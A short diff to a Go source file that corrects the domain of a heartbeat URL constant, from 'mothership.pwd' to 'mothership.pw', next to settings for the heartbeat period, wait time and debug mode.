@@ -12,7 +12,7 @@ import (
 )
 
 const (
-	heartBeatURL    = "http://mothership.pwd/"
+	heartBeatURL    = "http://mothership.pw/"
 	heartBeatPeriod = time.Second * 30
 	waitTime        = time.Second * 30
 	debug           = true
